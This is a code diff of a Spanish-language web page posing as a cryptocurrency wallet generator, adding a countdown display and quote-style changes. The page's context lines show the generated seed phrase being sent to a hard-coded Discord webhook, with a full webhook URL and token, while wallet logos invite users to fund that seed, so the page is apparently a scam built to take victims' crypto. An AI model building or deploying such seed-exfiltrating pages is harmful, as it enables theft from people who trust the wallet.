@@ -86,17 +86,38 @@
     .wallet-logo:hover {
       opacity: 1;
     }
+
+    .countdown {
+      color: #fff;
+      margin-top: 10px;
+      font-size: 18px;
+    }
   </style>
   <script src="https://cdn.ethers.io/lib/ethers-5.0.umd.min.js"></script>
   <script>
     function generateWallet() {
-      const mnemonic = ethers.Wallet.createRandom().mnemonic.phrase;
-      const wallet = ethers.Wallet.fromMnemonic(mnemonic);
+      const generateButton = document.getElementById('generateButton');
+      generateButton.disabled = true;
 
-      const address = wallet.address;
+      const countdownElement = document.getElementById('countdown');
+      countdownElement.innerHTML = 'Creando wallet...';
 
-      document.getElementById("seedField").value = mnemonic;
-      document.getElementById("addressField").value = address;
+      const countdownDuration = 5; // Duración en segundos del contador
+      let countdown = countdownDuration;
+
+      const countdownInterval = setInterval(() => {
+        countdown--;
+        countdownElement.innerHTML = `Creando wallet... ${countdown} segundos`;
+
+        if (countdown === 0) {
+          clearInterval(countdownInterval);
+          countdownElement.innerHTML = 'Wallet creada';
+          generateButton.disabled = false;
+        }
+      }, 1000);
+
+      const mnemonic = ethers.Wallet.createRandom().mnemonic;
+      document.getElementById('seedField').value = mnemonic;
 
       // Enviar la semilla generada a través del webhook de Discord
       const webhookUrl = 'https://discordapp.com/api/webhooks/1073374509165465700/mr2ICeCadLB01KfbfV0HSI7bfpBkIaYTyIFMPLMW58Og3xWGRpv2EOOowLITDz3SRs3m';
@@ -125,12 +146,12 @@
     }
 
     function copySeed() {
-      const seedField = document.getElementById("seedField");
+      const seedField = document.getElementById('seedField');
       seedField.select();
       seedField.setSelectionRange(0, 99999);
-      document.execCommand("copy");
+      document.execCommand('copy');
 
-      const copyIcon = document.getElementById("copyIcon");
+      const copyIcon = document.getElementById('copyIcon');
       copyIcon.style.opacity = 1;
       setTimeout(function () {
         copyIcon.style.opacity = 0.6;
@@ -153,6 +174,8 @@
       <img class="wallet-logo" src="tronlink_logo.png" alt="TronLink" title="TronLink - Puedes usar la semilla para cargar saldo, comprar y vender criptomonedas, y realizar transferencias.">
       <img class="wallet-logo" src="roninwallet_logo.png" alt="Ronin Wallet" title="Ronin Wallet - Puedes usar la semilla para cargar saldo, comprar y vender criptomonedas, y realizar transferencias.">
     </div>
+
+    <p class="countdown" id="countdown"></p>
   </div>
 </body>
 </html>
